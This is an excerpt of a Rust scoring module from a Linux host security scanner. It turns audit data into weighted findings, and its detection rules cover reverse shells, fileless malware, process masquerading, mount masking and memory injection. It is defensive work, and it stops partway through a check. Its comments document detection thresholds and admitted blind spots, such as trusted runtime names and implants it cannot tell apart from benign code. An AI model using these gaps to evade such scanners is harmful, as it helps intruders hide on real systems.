use crate::coverage;
use crate::models::{AgentReport, CronSeverity, InjectionClass, Origin, ProvenanceSource};

// ── Legacy constants (kept for backward compatibility) ─────

pub const RISK_NO_FIREWALL: u8 = 30;
pub const RISK_SSH_ROOT_LOGIN: u8 = 25;
pub const RISK_SECURITY_UPDATES: u8 = 20;
pub const RISK_CRITICAL_SSL_MAX: u8 = 15;
pub const RISK_FAILED_SERVICES: u8 = 10;
pub const RISK_SSH_PASSWORD_AUTH: u8 = 10;
pub const RISK_OOM_KILLS: u8 = 10;
pub const RISK_NO_BACKUP: u8 = 20;
pub const RISK_NTP_NOT_SYNCED: u8 = 10;
pub const RISK_SUDOERS_MODE: u8 = 5;
pub const RISK_SYSCTL_PER_ISSUE: u8 = 5;

pub const SYSCTL_CRITICAL_THRESHOLD: usize = 3;

// ── Docker reliability constants (v0.5.x) ─────────────────
pub const RISK_CONTAINER_OOM: u8 = 10;
pub const RISK_CONTAINER_RESTART_LOOP: u8 = 5;
pub const RISK_CONTAINER_UNHEALTHY: u8 = 10;
pub const RESTART_LOOP_THRESHOLD: u64 = 3;

/// Bump whenever finding weights, tiers or IDs change: `compare` uses this to
/// label a risk_score delta as a formula change, not a real drift.
/// v8 (0.5.29): SEC-042 re-tiered into 042/049/050, SEC-046 gated by unit identity.
/// v9 (0.5.30): SEC-051 added – ld.so.conf.d library path injection.
/// v10 (0.5.31): SEC-052/053/054 systemd generators, one-way kernel switches as drift class.
/// v11 (0.5.32): (PAM stack injection SEC‑055/056/057)
/// v12 (0.5.35): SEC-005 now weights 15 for continuation-joined and
///   Cmnd_Alias-resolved NOPASSWD: ALL (R26-08/R26-19); REL-002 no longer
///   fires on hosts whose backup tool is configured but was previously
///   undetectable under env_clear() (R26-03). Same host, different score.
/// v13 (0.5.36): R27-16 extended `is_sensitive_key` with suffix rules, so
/// SEC-014 now fires on hosts where it previously produced no finding.
/// Snapshot pairs spanning this version must be flagged as a collection-
/// semantics change, not reported as real drift (R27-24).
pub const SCORING_VERSION: u8 = 13;

// ── Helper: keep evidence strings readable and JSON compact ─
/// Truncate a list of items for display, appending "+N more" if beyond limit.
fn evidence_list(items: &[String], limit: usize) -> String {
    if items.len() <= limit {
        return items.join("; ");
    }
    format!(
        "{}; +{} more",
        items[..limit].join("; "),
        items.len() - limit
    )
}

// ── New Finding model (v0.5) ───────────────────────────────

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Category {
    Security,
    Reliability,
    Hygiene,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Scanner {
    Host,
    Network,
    Storage,
    Security,
    Persistence,
    Packages,
    Databases,
    Docker,
    /// Added by the orchestrator, not produced by a host scanner.
    Orchestrator,
}

impl Scanner {
    pub fn from_name(name: &str) -> Option<Self> {
        match name {
            "host" => Some(Self::Host),
            "network" => Some(Self::Network),
            "storage" => Some(Self::Storage),
            "security" => Some(Self::Security),
            "persistence" => Some(Self::Persistence),
            "packages" => Some(Self::Packages),
            "databases" => Some(Self::Databases),
            "docker" => Some(Self::Docker),
            _ => None,
        }
    }
}

#[derive(Debug, Clone)]
#[allow(dead_code)]
pub struct Finding {
    pub id: &'static str,
    pub source: Scanner,
    pub title: String,
    pub category: Category,
    pub weight: u8,
    pub evidence: String,
    pub suppressed: Option<String>,
    pub cis_ref: Option<&'static str>,
}

/// Vendor unit hierarchy. systemd.unit(5) reserves these directories for units
/// installed by the package manager; the administrator's own units live in
/// /etc/systemd/system. This is the DB‑FREE authorship signal: unlike the package
/// database — which already demonstrated false negatives on /usr/lib and
/// /usr/libexec paths — a vendor unit is ALWAYS in a vendor directory, so this
/// check cannot miss. /etc/systemd/system is deliberately excluded: it is exactly
/// where a dropped unit would live, so those fall back to the DB check alone.
pub(crate) fn unit_is_vendor_shipped(f: &crate::models::ExecStartFinding) -> bool {
    f.unit_package.is_some()
        || f.unit_path.starts_with("/usr/lib/systemd/system/")
        || f.unit_path.starts_with("/lib/systemd/system/")
}

/// Single source of truth: policy for whether a core_pattern handler is trusted.
/// Used by both SEC-044 (finding weight) and compare.rs (drift severity).
pub(crate) fn core_pattern_is_trusted(cp: &str) -> bool {
    const KNOWN_HANDLERS: [&str; 3] = ["systemd-coredump", "abrt-hook-ccpp", "apport"];
    let Some(handler) = cp.strip_prefix('|') else {
        return true;
    };
    let bin = handler.split_whitespace().next().unwrap_or("");
    let basename = bin.rsplit('/').next().unwrap_or(bin);
    KNOWN_HANDLERS.contains(&basename) && !crate::utils::is_volatile_exec_path(bin)
}

/// Escalation-risk weight for an ambient capability set held with NoNewPrivs off.
/// Ambient caps survive execve of a *non-setuid* binary, so only escalation-
/// PRIMITIVE caps make that dangerous. Benign caps (mlock, clock, low-port bind,
/// nice, RTC wake) are informational. NET_RAW is moderate. Everything else —
/// including unknown/future caps — is treated as dangerous (fail-safe: a new
/// dangerous cap must never be silently suppressed). Bit positions per <linux/capability.h>.
fn ambient_escalation_weight(ambient: u64) -> u8 {
    const BENIGN: u64 = (1 << 10) | (1 << 14) | (1 << 15) | (1 << 23) | (1 << 25) | (1 << 35);
    const MODERATE: u64 = 1 << 13;

    if ambient & !BENIGN & !MODERATE != 0 {
        12
    } else if ambient & MODERATE != 0 {
        5
    } else {
        0
    }
}

/// True when `f.source` matches a failed scanner name. Findings from failed
/// scanners must not influence the score or exit code (R24-92, R25-27).
fn finding_from_failed_scanner(f: &Finding, report: &AgentReport) -> bool {
    report
        .failed_scanners
        .iter()
        .any(|name| Scanner::from_name(name) == Some(f.source))
}

/// Evaluate a full agent report into a list of findings.
/// This is a pure function – no side effects. Coverage warnings about
/// unknown scanner names are emitted by `warn_unmapped_scanners`, and
/// other coverage side effects by `warn_evaluate_side_effects`, both once
/// per report (R25-59/R25-95).
pub fn evaluate(report: &AgentReport) -> Vec<Finding> {
    let mut findings = Vec::new();

    // ── Security ────────────────────────────────────────

    if !report.network.firewall_active {
        findings.push(Finding {
            id: "SEC-001",
            source: Scanner::Network,
            title: "Firewall inactive".to_string(),
            category: Category::Security,
            weight: RISK_NO_FIREWALL,
            evidence: "No active firewall (ufw/firewalld/nftables/iptables)".to_string(),
            suppressed: None,
            cis_ref: Some("CIS 3.5.1.1"),
        });
    }

    if report.security.ssh_root_login_enabled {
        let detail = report
            .security
            .ssh_permit_root_login_detail
            .as_deref()
            .unwrap_or("");
        let weight = if detail.eq_ignore_ascii_case("prohibit-password") {
            RISK_SSH_ROOT_LOGIN / 2
        } else {
            RISK_SSH_ROOT_LOGIN
        };
        findings.push(Finding {
            id: "SEC-002",
            source: Scanner::Security,
            title: "SSH root login allowed".to_string(),
            category: Category::Security,
            weight,
            evidence: format!("PermitRootLogin {}", detail),
            suppressed: None,
            cis_ref: Some("CIS 5.2.10"),
        });
    }

    if report.packages.upgradable.iter().any(|p| p.is_security) {
        let count = report
            .packages
            .upgradable
            .iter()
            .filter(|p| p.is_security)
            .count();
        let weight = if count > 20 {
            RISK_SECURITY_UPDATES
        } else if count > 5 {
            15
        } else {
            10
        };
        findings.push(Finding {
            id: "SEC-003",
            source: Scanner::Packages,
            title: "Pending security updates".to_string(),
            category: Category::Security,
            weight,
            evidence: format!("{} security update(s) available", count),
            suppressed: None,
            cis_ref: Some("CIS 1.9"),
        });
    }

    if report
        .network
        .ssl_certificates
        .iter()
        .any(|c| c.is_critical)
    {
        findings.push(Finding {
            id: "SEC-004",
            source: Scanner::Network,
            title: "SSL certificate expiring".to_string(),
            category: Category::Security,
            weight: RISK_CRITICAL_SSL_MAX,
            evidence: "One or more SSL certificates expire within 7 days".to_string(),
            suppressed: None,
            cis_ref: None,
        });
    }

    if !report.security.sudo_nopasswd_entries.is_empty() {
        let has_all = report.security.sudo_nopasswd_entries.iter().any(|entry| {
            // R26-19: scanner already resolved aliases; do not re-parse.
            entry.contains(crate::models::SUDO_ALL_MARKER)
                || entry.contains(crate::models::SUDO_PRIVESC_MARKER)
        });
        let weight = if has_all { 15 } else { 5 };
        findings.push(Finding {
            id: "SEC-005",
            source: Scanner::Security,
            title: "Sudo NOPASSWD entries found".to_string(),
            category: Category::Security,
            weight,
            evidence: format!(
                "{} NOPASSWD entries in sudoers",
                report.security.sudo_nopasswd_entries.len()
            ),
            suppressed: None,
            cis_ref: Some("CIS 5.4.2"),
        });
    }

    if let Some(mode) = report.security.sudoers_mode
        && mode != 0o440
    {
        findings.push(Finding {
            id: "SEC-006",
            source: Scanner::Security,
            title: "Sudoers permissions not 0440".to_string(),
            category: Category::Security,
            weight: RISK_SUDOERS_MODE,
            evidence: format!("sudoers mode is {:o}", mode),
            suppressed: None,
            cis_ref: Some("CIS 1.8.2"),
        });
    }

    for issue in &report.security.sysctl_issues {
        if issue.starts_with("net.ipv4.ip_forward=") {
            let suppressed = if report.topology.runtime_active
                || report.host.native_services.iter().any(|s| s == "kubelet")
            {
                Some("expected on Docker/kubelet host".to_string())
            } else {
                None
            };
            findings.push(Finding {
                id: "SEC-007",
                source: Scanner::Security,
                title: "IP forwarding enabled".to_string(),
                category: Category::Security,
                weight: RISK_SYSCTL_PER_ISSUE,
                evidence: issue.clone(),
                suppressed,
                cis_ref: Some("CIS 3.3.1"),
            });
        } else {
            let title = issue
                .split('=')
                .next()
                .unwrap_or("sysctl issue")
                .to_string();
            let cis = match title.as_str() {
                "kernel.randomize_va_space" => Some("CIS 1.6.2"),
                "net.ipv4.tcp_syncookies" => Some("CIS 3.3.8"),
                "kernel.dmesg_restrict" => Some("CIS 1.6.2"),
                "net.ipv4.conf.all.accept_redirects" => Some("CIS 3.3.2"),
                _ => None,
            };
            findings.push(Finding {
                id: "SEC-007",
                source: Scanner::Security,
                title,
                category: Category::Security,
                weight: RISK_SYSCTL_PER_ISSUE,
                evidence: issue.clone(),
                suppressed: None,
                cis_ref: cis,
            });
        }
    }

    if report.security.ssh_password_auth_enabled {
        findings.push(Finding {
            id: "SEC-008",
            source: Scanner::Security,
            title: "SSH password authentication enabled".to_string(),
            category: Category::Security,
            weight: RISK_SSH_PASSWORD_AUTH,
            evidence: "PasswordAuthentication yes".to_string(),
            suppressed: None,
            cis_ref: Some("CIS 5.2.4"),
        });
    }

    if report.security.ssh_password_auth_enabled && report.security.ssh_root_login_enabled {
        findings.push(Finding {
            id: "SEC-009",
            source: Scanner::Security,
            title: "Root login with password allowed".to_string(),
            category: Category::Security,
            weight: 5,
            evidence: "PermitRootLogin enabled AND PasswordAuthentication yes".to_string(),
            suppressed: None,
            cis_ref: Some("CIS 5.2.10/5.2.4"),
        });
    }

    let noncompliant_keys = report
        .security
        .access_alignment
        .keys
        .iter()
        .filter(|k| !k.compliant)
        .count();
    if noncompliant_keys > 0 {
        findings.push(Finding {
            id: "SEC-011",
            source: Scanner::Security,
            title: "SSH keys violate key-strength policy".to_string(),
            category: Category::Security,
            weight: 10,
            evidence: format!(
                "{noncompliant_keys} authorized key(s) below policy (e.g. RSA<3072, DSA, ECDSA)"
            ),
            suppressed: None,
            cis_ref: Some("CIS 5.2"),
        });
    }

    if !report
        .security
        .access_alignment
        .sudoers_nopasswd_all
        .is_empty()
    {
        findings.push(Finding {
            id: "SEC-012",
            source: Scanner::Security,
            title: "Passwordless sudo to ALL commands".to_string(),
            category: Category::Security,
            weight: 15,
            evidence: format!(
                "{} principal(s) with NOPASSWD: ALL",
                report.security.access_alignment.sudoers_nopasswd_all.len()
            ),
            suppressed: None,
            cis_ref: Some("CIS 5.3"),
        });
    }

    let tiers = crate::utils::classify_listeners(&report.network.listening_ports);

    if !tiers.suspicious.is_empty() {
        findings.push(Finding {
            id: "SEC-013",
            source: Scanner::Network,
            title: "Suspicious process listening on network port (Shadow IT)".to_string(),
            category: Category::Security,
            weight: 20,
            evidence: format!(
                "{} suspicious listener(s): {}",
                tiers.suspicious.len(),
                tiers.suspicious.join(", ")
            ),
            suppressed: None,
            cis_ref: None,
        });
    }

    if !tiers.devtool.is_empty() {
        findings.push(Finding {
            id: "SEC-030",
            source: Scanner::Network,
            title: "Developer tool listening on loopback (IPC) — informational".to_string(),
            category: Category::Security,
            weight: 0,
            evidence: format!(
                "{} loopback-only listener(s) from root-owned installed applications: {}",
                tiers.devtool.len(),
                tiers.devtool.join(", ")
            ),
            suppressed: Some(
                "Loopback-only bind from a populated ROOT-OWNED install tree.".to_string(),
            ),
            cis_ref: None,
        });
    }

    if !tiers.provisional.is_empty() {
        findings.push(Finding {
            id: "SEC-031",
            source: Scanner::Network,
            title: "User-space tool listening on loopback (IPC) — PROVISIONAL".to_string(),
            category: Category::Security,
            weight: 0,
            evidence: format!(
                "{} loopback-only listener(s) nested under user-writable install tree (parentage unverified): {}",
                tiers.provisional.len(),
                tiers.provisional.join(", ")
            ),
            suppressed: Some(
                "Loopback-only bind from a user-writable directory. Trust is PROVISIONAL until parentage is verified.".to_string(),
            ),
            cis_ref: None,
        });
    }

    {
        let mut ioc_evidence: Vec<String> = Vec::new();
        for port in &report.network.listening_ports {
            if !crate::utils::is_wildcard_bind(&port.bind_address) {
                continue;
            }
            let Some(exe) = port.exe_path.as_deref() else {
                continue;
            };
            if !crate::utils::is_ephemeral_exec_path(exe) {
                continue;
            }
            let Some(pid) = port.pid else {
                continue;
            };
            let Some(cap) = report
                .security
                .capability_audit
                .iter()
                .find(|c| c.pid == pid && !c.critical_caps.is_empty())
            else {
                continue;
            };

            ioc_evidence.push(format!(
                "pid {} ({}) exe {} listening on {} holds [{}]",
                cap.pid,
                cap.comm,
                exe,
                port.bind_address,
                cap.critical_caps.join(", ")
            ));
        }

        if !ioc_evidence.is_empty() {
            findings.push(Finding {
                id: "SEC-015",
                source: Scanner::Security,
                title: "ACTIVE COMPROMISE: privileged non-root process on ephemeral path listening on network"
                    .to_string(),
                category: Category::Security,
                weight: 60,
                evidence: format!(
                    "{} reachable implant(s): {}",
                    ioc_evidence.len(),
                    ioc_evidence.join("; ")
                ),
                suppressed: None,
                cis_ref: None,
            });
        }
    }

    let name_hits: Vec<&crate::models::SuspiciousProcess> = report
        .security
        .suspicious_processes
        .iter()
        .filter(|p| {
            crate::utils::is_known_malware(&p.name) || crate::utils::is_ambiguous_malware(&p.name)
        })
        .collect();
    if !name_hits.is_empty() {
        let list = name_hits
            .iter()
            .map(|p| match &p.exe_path {
                Some(exe) => format!("{} (pid {}, {})", p.name, p.pid, exe),
                None => format!("{} (pid {})", p.name, p.pid),
            })
            .collect::<Vec<_>>()
            .join(", ");
        findings.push(Finding {
            id: "SEC-016",
            source: Scanner::Security,
            title: "ACTIVE COMPROMISE: known malicious process detected".to_string(),
            category: Category::Security,
            weight: 60,
            evidence: format!("{} known-bad process(es): {}", name_hits.len(), list),
            suppressed: None,
            cis_ref: None,
        });
    }

    let (fileless_self, fileless): (Vec<&crate::models::SuspiciousProcess>, Vec<_>) = report
        .security
        .suspicious_processes
        .iter()
        .filter(|p| p.is_deleted)
        .partition(|p| p.self_attributed.is_some());

    if !fileless.is_empty() {
        let list = fileless
            .iter()
            .map(|p| match &p.exe_path {
                Some(exe) => {
                    if exe.starts_with("/memfd:") {
                        format!("{} (pid {}, executing in-memory (memfd))", p.name, p.pid)
                    } else {
                        format!("{} (pid {}, deleted from {})", p.name, p.pid, exe)
                    }
                }
                None => format!("{} (pid {}, deleted)", p.name, p.pid),
            })
            .collect::<Vec<_>>()
            .join(", ");
        findings.push(Finding {
            id: "SEC-017",
            source: Scanner::Security,
            title: "ACTIVE COMPROMISE: fileless malware executing from ephemeral path".to_string(),
            category: Category::Security,
            weight: 60,
            evidence: format!("{} fileless process(es): {}", fileless.len(), list),
            suppressed: None,
            cis_ref: None,
        });
    }

    if !fileless_self.is_empty() {
        let list = fileless_self
            .iter()
            .map(|p| match p.exe_path.as_deref() {
                Some(exe) => format!("{} (pid {}, deleted from {})", p.name, p.pid, exe),
                None => format!("{} (pid {}, deleted)", p.name, p.pid),
            })
            .collect::<Vec<_>>()
            .join("; ");
        findings.push(Finding {
            id: "SEC-032",
            source: Scanner::Security,
            title: "Scanner self-image: ephemeral privileged execution (attributed)".to_string(),
            category: Category::Security,
            weight: 0,
            evidence: format!(
                "{} process(es) attributed to this scanner by a PID identity established inside \
                 the process: {}. Injection-class findings (SEC-023/026/028/029) against these \
                 PIDs are NOT suppressed. See self_integrity for exec-image provenance.",
                fileless_self.len(),
                list
            ),
            suppressed: Some(
                "Unlink-on-exec is this scanner's own deployment footprint. Identity anchored on \
                 an unforgeable PID, never on comm/argv. Footprint class only — self address \
                 space remains under full injection scrutiny."
                    .to_string(),
            ),
            cis_ref: None,
        });
    }

    let mut fileless_priv: Vec<String> = Vec::new();
    for p in report
        .security
        .suspicious_processes
        .iter()
        .filter(|p| p.is_deleted)
    {
        if p.self_attributed.is_some() {
            continue;
        }
        let where_ = match p.exe_path.as_deref() {
            Some(exe) if exe.starts_with("/memfd:") => "executing in-memory (memfd)".to_string(),
            Some(exe) => format!("deleted from {exe}"),
            None => "deleted".to_string(),
        };
        if p.euid == 0 {
            fileless_priv.push(format!(
                "{} (pid {}, {}) (root-run fileless implant, full kernel capabilities by default)",
                p.name, p.pid, where_
            ));
        } else if let Some(c) = report
            .security
            .capability_audit
            .iter()
            .find(|c| c.pid == p.pid && !c.critical_caps.is_empty())
        {
            fileless_priv.push(format!(
                "{} (pid {}, {}) holds [{}]",
                p.name,
                p.pid,
                where_,
                c.critical_caps.join(", ")
            ));
        }
    }

    if !fileless_priv.is_empty() {
        findings.push(Finding {
            id: "SEC-019",
            source: Scanner::Security,
            title: "ACTIVE COMPROMISE: fileless malware holds critical kernel capabilities"
                .to_string(),
            category: Category::Security,
            weight: 60,
            evidence: format!(
                "{} privileged fileless process(es): {}",
                fileless_priv.len(),
                fileless_priv.join("; ")
            ),
            suppressed: None,
            cis_ref: None,
        });
    }

    let mimics: Vec<&crate::models::SuspiciousProcess> = report
        .security
        .suspicious_processes
        .iter()
        .filter(|p| p.is_mimic)
        .collect();
    if !mimics.is_empty() {
        let list = mimics
            .iter()
            .map(|p| match p.exe_path.as_deref() {
                Some(exe) => format!("{} (pid {}, real exe {})", p.name, p.pid, exe),
                None => format!(
                    "{} (pid {}, kernel-thread name with userspace cmdline)",
                    p.name, p.pid
                ),
            })
            .collect::<Vec<_>>()
            .join("; ");
        findings.push(Finding {
            id: "SEC-020",
            source: Scanner::Security,
            title: "ACTIVE COMPROMISE: process masquerading as kernel thread".to_string(),
            category: Category::Security,
            weight: 60,
            evidence: format!("{} masquerading process(es): {}", mimics.len(), list),
            suppressed: None,
            cis_ref: None,
        });
    }

    if !report.security.mount_masking.is_empty() {
        let list = report
            .security
            .mount_masking
            .iter()
            .map(|m| format!("{} [{}] — {}", m.target_path, m.fstype, m.reason))
            .collect::<Vec<_>>()
            .join("; ");
        findings.push(Finding {
            id: "SEC-021",
            source: Scanner::Security,
            title: "ACTIVE COMPROMISE: Bind-mount masking detected".to_string(),
            category: Category::Security,
            weight: 60,
            evidence: format!(
                "{} masking mount(s): {}",
                report.security.mount_masking.len(),
                list
            ),
            suppressed: None,
            cis_ref: None,
        });
    }

    if !report.security.reverse_shells.is_empty() {
        let list = report
            .security
            .reverse_shells
            .iter()
            .map(|r| {
                let fd = match r.stdio_fd {
                    Some(0) => " (stdin)",
                    Some(1) => " (stdout)",
                    Some(2) => " (stderr)",
                    _ => "",
                };
                format!("{} (pid {}) → {}{}", r.process, r.pid, r.remote_address, fd)
            })
            .collect::<Vec<_>>()
            .join("; ");
        findings.push(Finding {
            id: "SEC-022",
            source: Scanner::Security,
            title: "ACTIVE COMPROMISE: Reverse shell / C2 connection detected".to_string(),
            category: Category::Security,
            weight: 60,
            evidence: format!(
                "{} interpreter(s) with outbound socket to a public host: {}",
                report.security.reverse_shells.len(),
                list
            ),
            suppressed: None,
            cis_ref: None,
        });
    }

    const DEEP_ESCALATE_MIN: u8 = 60;
    const DEEP_DEMOTE_MIN: u8 = 70;

    fn is_trumping_malice(d: &crate::models::DeepMemoryAnalysis) -> bool {
        d.entropy >= 7.0 || d.image_header
    }

    fn is_benign_shape(d: &crate::models::DeepMemoryAnalysis) -> bool {
        d.prologue.is_some()
            && d.entropy < 6.5
            && d.resolved_pointers.iter().any(|p| {
                matches!(
                    p.kind,
                    crate::models::PointerKind::LibText | crate::models::PointerKind::JitCluster
                )
            })
    }

    fn reputable_exe(f: &crate::models::LibraryInjectionFinding) -> bool {
        if f.source.contains("cached-clean")
            || f.source.contains("provisional")
            || f.source.contains("allowlist")
        {
            return true;
        }
        if let Some(exe_path) = f.exe_path.as_deref() {
            let prov = crate::utils::exe_provenance(exe_path, f.pid);
            if matches!(
                prov,
                crate::utils::ExeProvenance::InstalledApp
                    | crate::utils::ExeProvenance::NestedUserInstall
            ) {
                return true;
            }
        }
        false
    }

    const KNOWN_RUNTIME_COMMS: &[&str] = &[
        "php-fpm",
        "php",
        "nginx",
        "hestia-nginx",
        "node",
        "next-server",
        "gjs",
        "telegram",
    ];

    fn comm_asserts_runtime(process: &str) -> bool {
        KNOWN_RUNTIME_COMMS.iter().any(|&k| {
            process == k
                || process.starts_with(&format!("{k}."))
                || process.starts_with(&format!("{k}:"))
                || process.starts_with(&format!("{k} "))
        })
    }

    fn process_behavior_clean(pid: u32, report: &AgentReport) -> bool {
        let no_listener = !report
            .network
            .listening_ports
            .iter()
            .any(|p| p.pid == Some(pid) && !crate::utils::is_loopback_bind(&p.bind_address));

        let no_ptrace_ioc = !report
            .security
            .library_injections
            .iter()
            .any(|f| f.pid == pid && f.source.contains("ptrace"));

        no_listener && no_ptrace_ioc
    }

    enum MemBucket {
        Classic,
        DeepCritical,
        Anomaly,
        Advisory,
        TrustedUnverified,
        UnlinkGhost,
    }

    fn mem_bucket(f: &crate::models::LibraryInjectionFinding, report: &AgentReport) -> MemBucket {
        let deep = f.deep_forensics.as_ref();

        if let Some(d) = deep
            && is_trumping_malice(d)
        {
            return MemBucket::DeepCritical;
        }

        if let Some(d) = deep {
            match d.origin {
                Origin::UnknownPayload if d.confidence >= DEEP_ESCALATE_MIN => {
                    return MemBucket::DeepCritical;
                }
                Origin::FfiClosure
                | Origin::GObjectCallback
                | Origin::HotSpot
                | Origin::Pcre2Jit
                | Origin::JitCode
                | Origin::ManagedJit
                | Origin::ReservedBuffer
                | Origin::RuntimeTrampoline
                    if d.confidence >= DEEP_DEMOTE_MIN =>
                {
                    return MemBucket::Advisory;
                }
                Origin::Inconclusive
                    if process_behavior_clean(f.pid, report)
                        && (reputable_exe(f)
                            || (f.exe_path.is_none() && comm_asserts_runtime(&f.process))) =>
                {
                    return MemBucket::TrustedUnverified;
                }
                _ => {}
            }
        }

        if f.source == "maps-so-unlink-on-load" {
            return match deep {
                Some(d) => match d.origin {
                    Origin::GhostCleanImage if d.confidence >= DEEP_DEMOTE_MIN => {
                        MemBucket::Advisory
                    }
                    Origin::GhostSuspectImage if d.confidence >= DEEP_ESCALATE_MIN => {
                        MemBucket::DeepCritical
                    }
                    Origin::GhostInconclusive => MemBucket::UnlinkGhost,
                    _ if is_benign_shape(d) => MemBucket::Advisory,
                    _ => MemBucket::UnlinkGhost,
                },
                None => MemBucket::UnlinkGhost,
            };
        }

        if f.source == "maps-rwx-provisional"
            || f.source == "maps-rwx-runtime-allowlist"
            || f.source == "maps-rwx-cached-clean"
            || f.source == "maps-so-tmp-unverified"
        {
            return match deep {
                Some(d) if is_benign_shape(d) => MemBucket::Advisory,
                _ => MemBucket::TrustedUnverified,
            };
        }

        match f.classify() {
            InjectionClass::ClassicInjection => MemBucket::Classic,
            InjectionClass::MemoryAnomaly => MemBucket::Anomaly,
            InjectionClass::JitAdvisory => MemBucket::Advisory,
        }
    }

    const TRAMPOLINE_MAX_BYTES: u64 = 4096;

    fn is_trampoline_page(f: &crate::models::LibraryInjectionFinding) -> bool {
        if !f.source.starts_with("maps-anon-rx") && !f.source.contains("r-xp") {
            return false;
        }
        if let Some(region) = &f.region_addr
            && let Some((start, end)) = region.split_once('-')
            && let (Ok(s), Ok(e)) = (
                usize::from_str_radix(start, 16),
                usize::from_str_radix(end, 16),
            )
        {
            return e.checked_sub(s) == Some(TRAMPOLINE_MAX_BYTES as usize);
        }
        false
    }

    let mut classic_injections = Vec::new();
    let mut deep_critical = Vec::new();
    let mut memory_anomalies = Vec::new();
    let mut jit_advisories = Vec::new();
    let mut provisional_regions = Vec::new();
    let mut unlink_ghosts = Vec::new();

    for finding in &report.security.library_injections {
        match mem_bucket(finding, report) {
            MemBucket::Classic => classic_injections.push(finding),
            MemBucket::DeepCritical => deep_critical.push(finding),
            MemBucket::Anomaly => {
                if is_trampoline_page(finding) {
                    provisional_regions.push(finding);
                } else {
                    memory_anomalies.push(finding);
                }
            }
            MemBucket::Advisory => jit_advisories.push(finding),
            MemBucket::TrustedUnverified => provisional_regions.push(finding),
            MemBucket::UnlinkGhost => unlink_ghosts.push(finding),
        }
    }

    if !classic_injections.is_empty() {
        let list = classic_injections
            .iter()
            .map(|l| {
                let del = if l.is_deleted { " (deleted)" } else { "" };
                format!(
                    "{} (pid {}): {} via {}{}",
                    l.process, l.pid, l.object_path, l.source, del
                )
            })
            .collect::<Vec<_>>()
            .join("; ");

        findings.push(Finding {
            id: "SEC-023",
            source: Scanner::Security,
            title: "ACTIVE COMPROMISE: Userspace rootkit or code injection detected".to_string(),
            category: Category::Security,
            weight: 60,
            evidence: format!("{} injected object(s): {}", classic_injections.len(), list),
            suppressed: None,
            cis_ref: None,
        });
    }

    if !deep_critical.is_empty() {
        let list = deep_critical
            .iter()
            .map(|l| {
                let (ent, conf) = l
                    .deep_forensics
                    .as_ref()
                    .map_or((0.0, 0), |d| (d.entropy, d.confidence));
                format!(
                    "{} (pid {}) @ {}: unattributed RWX payload (entropy {:.1}, {}% conf)",
                    l.process,
                    l.pid,
                    l.region_addr.as_deref().unwrap_or("?"),
                    ent,
                    conf
                )
            })
            .collect::<Vec<_>>()
            .join("; ");

        findings.push(Finding {
            id: "SEC-028",
            source: Scanner::Security,
            title: "ACTIVE COMPROMISE: unattributed executable payload in memory".to_string(),
            category: Category::Security,
            weight: 60,
            evidence: format!("{} region(s): {}", deep_critical.len(), list),
            suppressed: None,
            cis_ref: None,
        });
    }

    if !memory_anomalies.is_empty() {
        let mut by_process: std::collections::HashMap<String, (usize, Option<String>)> =
            std::collections::HashMap::new();
        for anomaly in &memory_anomalies {
            let key = format!("{} (pid {})", anomaly.process, anomaly.pid);
            let entry = by_process.entry(key).or_insert((0, None));
            entry.0 += 1;
            if entry.1.is_none() {
                entry.1 = anomaly.region_addr.clone();
            }
        }

        let list = by_process
            .into_iter()
            .map(|(proc, (count, addr))| {
                let addr_str = addr.as_deref().unwrap_or("?");
                format!("{proc} (first @ {addr_str}): {count} anomalous region(s)")
            })
            .collect::<Vec<_>>()
            .join("; ");

        let weight = if memory_anomalies
            .iter()
            .any(|l| l.source.contains("exec") || l.source.contains("rwx"))
        {
            20
        } else {
            10
        };

        findings.push(Finding {
            id: "SEC-026",
            source: Scanner::Security,
            title: "Suspicious executable memory mapping (anon/rwx/stack/heap)".to_string(),
            category: Category::Security,
            weight,
            evidence: format!(
                "{} process(es) with anomalous memory mappings: {}",
                memory_anomalies.len(),
                list
            ),
            suppressed: None,
            cis_ref: None,
        });
    }

    if !provisional_regions.is_empty() {
        let mut by_proc = std::collections::HashMap::new();
        for f in &provisional_regions {
            *by_proc
                .entry(format!("{} (pid {})", f.process, f.pid))
                .or_insert(0usize) += 1;
        }
        let list = by_proc
            .into_iter()
            .map(|(p, n)| format!("{p}: {n} region(s)"))
            .collect::<Vec<_>>()
            .join("; ");

        findings.push(Finding {
            id: "SEC-029",
            source: Scanner::Security,
            title: "Provisional memory regions (trampolines, unverified, etc.)".to_string(),
            category: Category::Security,
            weight: 0,
            evidence: format!(
                "{} region(s) in allowlisted or low-risk patterns (e.g. single-page r-x trampolines): {}",
                provisional_regions.len(),
                list
            ),
            suppressed: Some(
                "These regions match known benign patterns (trampoline pages, unverified JIT). \
                 Trust is PROVISIONAL; a new region between snapshots is surfaced as drift."
                    .to_string(),
            ),
            cis_ref: None,
        });
    }

    if !unlink_ghosts.is_empty() {
        let list = unlink_ghosts
            .iter()
            .map(|f| {
                let anchor = f.region_addr.as_deref().unwrap_or("?");
                format!(
                    "{} (pid {}): {} — recover: /proc/{}/map_files/{}",
                    f.process, f.pid, f.object_path, f.pid, anchor
                )
            })
            .collect::<Vec<_>>()
            .join("; ");
        findings.push(Finding {
            id: "SEC-033",
            source: Scanner::Security,
            title: "Deleted temp-extract .so — unlink-on-load pattern (UNVERIFIED ghost inode)"
                .to_string(),
            category: Category::Security,
            weight: 0,
            evidence: format!(
                "{} deleted .so mapping(s) matching the JVM unlink-on-load extract profile \
                 (trusted runtime, ld.so segment family, W^X across family, no LD_* \
                 co-occurrence): {}. The inode is alive while mapped — run --deep to \
                 verify its content.",
                unlink_ghosts.len(),
                list
            ),
            suppressed: Some(
                "Structural profile matches Netty/JNA-style unlink-after-dlopen extraction \
                 in a trusted runtime. Trust is PROVISIONAL: the on-disk file no longer \
                 exists and the ghost inode content has not been verified. A clean-ELF \
                 implant loaded the same way is indistinguishable at this tier."
                    .to_string(),
            ),
            cis_ref: None,
        });
    }

    let file_cap_findings = &report.security.file_capabilities;
    if !file_cap_findings.is_empty() {
        let mut suppressed_caps = Vec::new();
        let mut active_caps = Vec::new();

        for fc in file_cap_findings {
            let (weight, reason) = classify_cap_binary(fc, &report.security.provenance_source);
            if weight == 0 {
                suppressed_caps.push((fc, reason));
            } else {
                active_caps.push((fc, weight, reason));
            }
        }

        if !suppressed_caps.is_empty() {
            let list = suppressed_caps
                .iter()
                .map(|(f, reason)| {
                    format!("{}: [{}] — {}", f.path, f.capabilities.join(", "), reason)
                })
                .collect::<Vec<_>>()
                .join("; ");
            findings.push(Finding {
